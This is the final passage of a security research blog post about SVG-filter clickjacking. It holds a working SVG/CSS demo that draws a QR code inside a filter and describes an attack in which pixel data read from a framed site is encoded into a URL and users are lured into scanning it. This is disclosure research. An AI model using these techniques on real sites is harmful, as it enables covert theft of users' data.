      <!-- Map input bytes into QR code shape -->
      <feImage xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAIAAABMXPacAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAFBhaW50Lk5FVCA1LjEuMTGKCBbOAAAAuGVYSWZJSSoACAAAAAUAGgEFAAEAAABKAAAAGwEFAAEAAABSAAAAKAEDAAEAAAADAAAAMQECABEAAABaAAAAaYcEAAEAAABsAAAAAAAAAKOTAADoAwAAo5MAAOgDAABQYWludC5ORVQgNS4xLjExAAADAACQBwAEAAAAMDIzMAGgAwABAAAAAQAAAAWgBAABAAAAlgAAAAAAAAACAAEAAgAEAAAAUjk4AAIABwAEAAAAMDEwMAAAAADY5TB4zfSjcAAAAd5JREFUeF7t1z1y00AUAGApl0rSpeYIHICKmhul5gCpqaBhwg0oKMNM2iRitavYGywZJvb42ZvvmzfSs6TxyG9/3QEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHIV+Op+kYTrvQVgdzqYzQRoYAbM/Id3qL751wzDF1/PxynTzhS1fcghtjIBUxDqe9cMYjzkm9WOri5GamYJSFy6xkqrfj/GYY23zyUhNrwEzI+DoNNwAufvPjIDj0kwDzE3r8yNg7kleZUsdy/XN46Z0fenWIRzv2PwP2wvXX3wfxj3or7wNfTddXRBWhwamoLKlWVWwyl+sAXUUdR4m/g12MI6Aq4/rf1vD/Xj8ct1dvs8ff47H7lPOb/OxxI91fvu5fFVYHU5/BNTdvOSpmvXHOn/KUV+P1kADVFudkqeRUX/cnkd7YyNgM48W/wY7+Mcu6Pxq3AV1H/J0n9eD4XeV3+U14GZ6uJwOr6VdUB1JmmdOYAQ00ABJnvfXUaQqL8z7dR6tjQZI6r5fpCov9Po6j9ZMA8xZ6vV1Hq3hBlju9XUerZkG+GsByJZ6fckfhu7JCNiP1QJQ4tlSry95+kv8UD0cJP4NdrDH/htWh6YXYQAAAAAAAAAAAAAAAAAAAJrTdX8Ad+QStY524CYAAAAASUVORK5CYII=" x=0 y=0 width=128 height=128 result=displace></feImage>
      <feDisplacementMap
        in=SourceGraphic
        in2=displace
        result=qrData
        scale="256"
        xChannelSelector="R"
        yChannelSelector="G" />
      <!-- Extract and apply invert map -->
      <feColorMatrix type=matrix in=displace
        values="0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0 0 0 1" />
      <feBlend mode=difference in2=qrData />
      <feOffset dx="-62" dy="-62" result=qrCode />
      <!-- Scale the code up 4x -->
      <feImage xlink:href="data:image/svg+xml,&lt;svg width='128' height='128' viewBox='0 0 128 128' xmlns='http://www.w3.org/2000/svg'&gt; &lt;defs&gt;&lt;linearGradient id='bx'&gt;&lt;stop style='stop-color:%23800080' offset='0%' /&gt;&lt;stop style='stop-color:%23000080' offset='100%' /&gt;&lt;/linearGradient&gt;&lt;linearGradient id='by' gradientTransform='rotate(90)'&gt;&lt;stop style='stop-color:%23008000' offset='0%' /&gt;&lt;stop style='stop-color:%23000000' offset='100%' /&gt;&lt;/linearGradient&gt;&lt;/defs&gt; &lt;rect fill='url(%23by)' x='0.5' y='0.5' width='128' height='128' /&gt; &lt;rect style='mix-blend-mode:screen' fill='url(%23bx)' x='0.5' y='0.5' width='128' height='128' /&gt; &lt;/svg&gt;" x="0" y="0" width="128" height="128" result="scale2x"></feImage>
      <feDisplacementMap
        in=qrCode
        scale="128"
        xChannelSelector="R"
        yChannelSelector="G" />
      <feDisplacementMap
        in2=scale2x
        scale="128"
        xChannelSelector="R"
        yChannelSelector="G" />
      <feTile x=0 y=0 width=96 height=96 />
    </filter>
</svg>

<style>
  @property --seconds {
    syntax: '<integer>';
    inherits: true;
    initial-value: 0;
  }
  @keyframes seconds {
    from {
      --seconds: 0;
    }
    to {
      --seconds: 9999;
    }
  }
  qr-demo {
    contain: strict;
    display: block;
    width: 96px;
    height: 96px;
    overflow: clip;
    --seconds: 0;
    animation: 9999s steps(9999, jump-end) infinite seconds;
    [d1] {
      --in: mod(var(--seconds), 10);
      --off: 132px;
    }
    [d2] {
      --in: mod(round(down, var(--seconds) / 10), 10);
      --off: 124px;
    }
    [d3] {
      --in: mod(round(down, var(--seconds) / 100), 10);
      --off: 116px;
    }
    [d4] {
      --in: mod(round(down, var(--seconds) / 1000), 10);
      --off: 108px;
    }
    [b1] {
      --val: mod(var(--in), 2);
      top: calc(var(--off) - 16px + 3px);
    }
    [b2] {
      --val: mod(round(down, var(--in) / 2), 2);
      top: calc(var(--off) - 16px + 2px);
    }
    [b3] {
      --val: mod(round(down, var(--in) / 4), 2);
      top: calc(var(--off) - 16px + 1px);
    }
    [b4] {
      --val: mod(round(down, var(--in) / 8), 2);
      top: calc(var(--off) - 16px + 0px);
    }
    qr-bit {
      position:absolute;
      display:block;
      width:8px;
      height:1px;
      background: hsl(0 0 calc(100% * var(--val)));
    }
  }
  @media not (resolution: 1x) {
    bad-scaling {
      color: red;
    }
  }
  @media (pointer: coarse) {
    bad-phone {
      color: red;
    }
  }
  @-moz-document url-prefix() {
    fire-fox {
      color: red;
    }
  }
  /* detect p3 (just using the media query doesn't work on mac with sRGB) */
  bad-color {
    position: relative;
    &::after {
      content: '';
      position: absolute;
      inset: 0;
      background: linear-gradient(#FF0,#FF0), color(display-p3 1 1 0);
      background-blend-mode: difference;
      filter: saturate(100) hue-rotate(90deg);
      mix-blend-mode: lighten;
      pointer-events: none;
    }
  }
</style>

This is a demo that displays a QR code telling you how many seconds you've been on this page for. It's a bit fiddly, so if it doesn't work make sure that you aren't using any <bad-scaling>display scaling</bad-scaling> or <bad-color>a custom color profile</bad-color>. On Windows you can toggle the *Automatically manage color for apps* setting, and on a Mac you can set the color profile to sRGB for it to work.

This demo <bad-phone>does not work on mobile devices</bad-phone>. And also, for the time being, <fire-fox>it only works in Chromium-based browsers</fire-fox>, but I believe it could be made to work in Firefox too.

Similarly, in a real attack, the scaling and color profile issues could be worked around using some JavaScript tricks or simply by implementing the filter a bit differently - this here is just a proof of concept that's a bit rough around the edges.

But yeah, that's a QR code generator built inside an SVG filter!

Took me a while to make, but I didn't want to write about it just being "theoretically possible".

### Attack scenario

So the attack scenario with the QR code is that you'd read pixels from a frame, process them to extract the data you want, encode them into a URL that looks something like *https://lyra.<span>horse</span>/?ref=c3VwZXIgc2VjcmV0IGluZm8* and render it as a QR code.

Then, you prompt the user to scan the QR code for whatever reason (eg anti-bot check). To them, the URL will seem like just a normal URL with a tracking ID or something in it.

Once the user opens the URL, your server gets the request and receives the data from the URL.

## And so on..

There are so many ways to make use of this technique I won't have time to go over them all in this post. Some examples would be reading text by using the difference blend mode, or exfiltrating data by making the user click on certain parts of the screen.

You could even insert data from the outside to have a fake mouse cursor inside the SVG that shows the <span style="cursor:pointer"><i>pointer</i> cursor</span> and reacts to fake buttons inside your SVG to make the exfiltration more realistic.

Or you could code up attacks with CSS and SVG where CSP doesn't allow for any JS.

Anyways, this post is long as is, so I'll leave figuring out these techniques as homework.


## Novel technique

This is the first time in my security research I've found a completely new technique!

I introduced it briefly at [my BSides talk in September](https://youtu.be/INgS4IipEhU?t=1516), and this post here is a more in-depth overview of the technique and how it can be used.

Of course, you can never know 100% for sure that a specific type of attack has never been found by anyone else, but my extensive search of existing security research has come up with nothing, so I suppose I can crown myself as the researcher who discovered it?

Here's some previous research I've found:
- [You click, I steal: analyzing and detecting click hijacking attacks in web pages](https://link.springer.com/article/10.1007/s10207-018-0423-3),  
[On the fragility and limitations of current Browser-provided Clickjacking
protection schemes](https://www.usenix.org/system/files/conference/woot12/woot12-final16.pdf)
  - The papers mention SVG filters in clickjacking attacks, but only in the context of obscuring the underlying elements, not running logic.
- [Pixel Perfect Timing - Attacks with HTML5](https://media.blackhat.com/us-13/US-13-Stone-Pixel-Perfect-Timing-Attacks-with-HTML5-WP.pdf),  
[
Security: SVG Filter Timing Attack](https://issues.chromium.org/issues/40077679)
  - Research on reading pixels through SVG filter timing attacks, which is a technique that is mitigated in modern browsers.
- [The Human Side Channel](https://ronmasas.com/posts/the-human-side-channel)
  - Some pretty cool clickjacking techniques, though no multi-step attacks or SVG logic.
- [SVG is turing-complete-ish](https://github.com/tom-p-reichel/svg-is-turing-complete)
  - Another example of logic gates in SVG I found after writing my blog. It's fun because it comes with [reddit](https://old.reddit.com/r/programming/comments/d4xcgs/svg_is_turing_complete/) and [hn](https://news.ycombinator.com/item?id=20980837) threads - I particularly like the comment asking about whether this turing completeness is useful or just a fun fact, which got a reply confirming the latter. <span style="font-size:101%">I like turning fun facts into vulnerabilities ^^.</span>
  - Note that whether SVG filters are actually turing complete is questionable because filters are implemented in constant-time and can't run in a loop. This doesn't mean they can't be turing complete, but it also doesn't prove that they are.

I don't think *me* discovering this technique was just luck though. I have a history of seeing things such as CSS as programming languages to exploit and be creative with. It wasn't a stretch for me to see SVG filters as a programming language either.

That, and my overlap between security research and creative projects - I often blur the lines between the two, which is what [Antonymph](https://lyra.horse/antonymph/) was born out of.

<p id=aws>In any case, <s-l>it feels</s-l> <span><m-m>
  <w-w style=--r:-8deg;--x:-4;--y:-5>yay</w-w>
  <w-w style=--r:4deg;--x:3;--y:14>:3</w-w>
  <w-w style=--r:-4deg;--x:15;--y:15>woof</w-w>
  <w-w style=--r:4deg;--x:12;--y:-6>yippie</w-w>
  <w-w style=--r:6deg;--x:38;--y:16>waow</w-w>
</m-m>awesome<m-m>
  <w-w style=--r:-8deg;--x:-32;--y:-5>meow</w-w>
  <w-w style=--r:8deg;--x:-8;--y:-5>awrf</w-w>
</m-m></span> <s-r>to discover</s-r> something like this.</p>

<style>
  #aws {
    s-l,s-r {
      display: inline-block;
      transition: transform 0.3s;
    }
    s-l { transform-origin: 0% 50% }
    s-r { transform-origin: 100% 50% }
    m-m{position:relative;w-w{position:absolute;font-size:50%;
    rotate:var(--r);translate:calc(var(--x) * 1px) calc(var(--y) * 1px);}}
    span {
      scale: 1;
      display: inline-block;
      transition: scale 0.3s, translate 0.3s;
      transform-origin: 50% 60%;
    }
    transition: color 0.3s;
    position: relative;
    z-index: 1;
    &:hover {
      color: #000;
      span { scale: 1.5 }
      s-l { transform: scaleX(0.69) }
      s-r { transform: scaleX(0.80) }
      &::after {
        visibility: visible;
        opacity: 1;
        transition: opacity 1s;
        @starting-style {
          opacity:0;
        }
      }
    }
    &::after {
      visibility: hidden;
      content: "";
      position: fixed;
      inset: 0;
      background: #FFF4;
      backdrop-filter: blur(0.5px);
      pointer-events: none;
      opacity: 0;
      z-index: -1;
      transition: opacity 1s, visibility 1s allow-discrete;
    }
  }
</style>

## afterword

whoa this post took such a long time for me to get done!

i started work on it in july, and was expecting to release it alongside [my CSS talk](https://youtu.be/INgS4IipEhU) in september, but it has taken me so much longer than expected to actually finish this thing. i wanted to make sure it was a good in-depth post, rather than something i just get out as soon as possible.

unlike my previous posts, i did unfortunately have to break my trend of using no images, since i needed a few data URIs within the SVG filters for demos. still, no images anywhere else in the post, no javascript, and just 42kB (gzip) of handcrafted html/css/svg.

also, i usually hide a bunch of easter eggs in my post that link to stuff i've enjoyed recently, but i have a couple links i didn't want to include without content warnings. [finding responsibility](https://youtu.be/UBdBoWAtLNI) is a pretty dark talk about the ethics of making sure your work won't end up killing people, and [youre the one ive always wanted](https://youtu.be/rQHYelsNgtU) is slightly nsfw doggyhell vent art.

btw i'll soon be giving talks at [39c3](https://events.ccc.de/en/category/39c3/) and [disobey 2026](https://disobey.fi/2026/)! the 39c3 one is titled "[css clicker training](https://fahrplan.events.ccc.de/congress/2025/fahrplan/event/css-clicker-training-making-games-in-a-styling-language)" and will be about css crimes and making games in css. and the disobey one is the same talk as the bsides one about using css to hack stuff and get bug bounties, but i'll make sure to throw some extra content in there to keep it fun.

see y'all around!!

&lt;3

*Note: I you're making content (articles, videos etc) based on this post, feel free to [reach out](https://lyra.horse/#:~:text=socials) to me to ask for questions or feedback.*

**Discuss this post on:** [twitter](https://twitter.com/rebane2001/status/1996581146662998516), [mastodon](https://infosec.exchange/@rebane2001/115661669658436967), [lobsters](https://lobste.rs/s/omnyrf/svg_filters_clickjacking_2_0)


[^refract]: This is a fancy way of saying it does a basic displacement of pixels.

[^aefx]: ...or After Effects/Blender/Fusion etc user. Or anything else computer graphics.

[^math]: **result = k1\*i1\*i2 + k2\*i1 + k3\*i2 + k4** in programmer language (I just couldn't resist trying out the \<math> tag for fun).

[^multiply]: The multiplication in this case is kind of the opposite of what you'd expect from the "multiply" blend mode - things will get lighter, not darker.

[^dataout]: It's not possible to get the pixel data out of a SVG filter as they're implemented in constant-time. If you *can* find a way to retrieve the data then it's a browser bug and you can most likely get bounty for it. Happy to collaborate if you'd like to turn such a finding into a working proof of concept for a report :).

[^codepen]: What I actually had after an hour was [this](https://gist.github.com/rebane2001/8ba35ad6e1b17c4cb5b2b2431d9e992c/revisions#diff-106c46aeca8c98d010362a57e574d9a6543362f34bb81c47081cece6fcbbbe48), the Codepen link is an updated version that I added controls to later on.

[^time-based]: We can actually pass the current time into an SVG filter, but we can't do attacks such as "if a pixel changes, wait 1 second and then show a dialog" unless we can piggyback off an animation in the source frame.

[^toomresources]: Since SVG filters are implemented in constant-time, they become pretty resource-intensive for complex filters on high-resolution targets. One optimization would be to have a full-resolution filter just for picking out the pixels, then a tiny-resolution backdrop-filter to run all the logic, and then another full-resolution filter to display the attack.

[^logsyms]: ¬ - NOT, ∧ - AND, ∨ - OR, ⊕ - XOR etc, see [List of logic symbols](https://en.wikipedia.org/wiki/List_of_logic_symbols).

[^hmph]: This is kind of similar to how I reported the [Docs/YouTube/Slides chain](https://lyra.horse/blog/2024/09/using-youtube-to-steal-your-files/) right before they 5x'd the VRP rewards. I seem to have the worst luck with timing my reports...

[^firstqr]: I released my QR code generator in 2021, making it the earliest publicly released Minecraft QR code generator. I know, however, that DavidJR was independently working on a QR code generator at the same time as I was, eventually [releasing it in 2023](https://www.youtube.com/watch?v=jKwrh-l31yY). Then there's one from Sep 2024 [by 37meliodas](https://www.youtube.com/watch?v=CcD7pqCDSS0), and lastly there's the probably most well-known one [by mattbatwings](https://www.youtube.com/watch?v=ZizmvuZ3EFk) from Dec 2024. The latter has an awesome video explaining everything in-depth, so I definitely recommend checking it out if you're interested in Minecraft redstone.
